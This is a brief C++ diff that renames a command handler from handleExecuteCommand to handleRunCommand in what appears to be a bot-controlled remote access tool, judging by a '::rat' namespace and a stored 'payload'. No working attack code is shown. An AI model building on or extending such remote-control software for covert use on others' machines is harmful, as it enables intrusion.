@@ -89,7 +89,7 @@ void Handler::handleFetchCommand() {
 	this->bot->sendMessage(command);
 }
 
-void Handler::handleExecuteCommand() {
+void Handler::handleRunCommand() {
 	const std::string time_stamp =
 	    ::rat::system::getCurrentDateTime_Underscored();
 	std::vector<uint8_t> payload = this->state.payload;
